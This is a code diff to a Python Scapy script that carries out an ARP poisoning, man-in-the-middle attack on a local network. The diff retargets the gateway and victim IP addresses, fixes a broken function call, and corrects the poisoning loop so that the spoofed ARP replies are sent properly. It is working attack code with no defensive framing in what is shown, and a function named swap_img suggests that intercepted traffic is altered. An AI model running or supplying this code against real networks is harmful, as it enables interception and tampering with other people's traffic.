@@ -5,8 +5,8 @@ import sys
 import threading
 import time
 
-gw_ip = "192.168.1.1"
-target_ip = "192.168.1.27"
+gw_ip = "192.168.0.45"
+target_ip = "192.168.0.2"
 broadcast = "ff:ff:ff:ff:ff:ff"
 
 def swap_img(pkt):
@@ -30,7 +30,7 @@ def get_mac_l3(ip_addr):
 def restore_network(gw_ip, gw_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst=broadcast, pdst=gw_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst=broadcast, pdst=target_ip, hwsrc=gw_mac, psrc=gw_ip), count=5)
-    disble_ipforwarding()
+    disable_ipforwarding()
 
 def disable_ipforwarding():
     print('[*] Disable IP forwarding')
@@ -41,8 +41,8 @@ def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
     print('[*] Started ARP poison attack [CTRL-C to stop]')
     try:
         while True:
-            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=gw_ip, hdst=gw_mac, psrc=target_ip))
-            sendp(Ether(dst=gw_mac)/ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=gw_ip))
+            send(ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip))
+            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip))
             time.sleep(2)
     except KeyboardInterrupt:
         print('[*] Stopped ARP poison, restoring...')
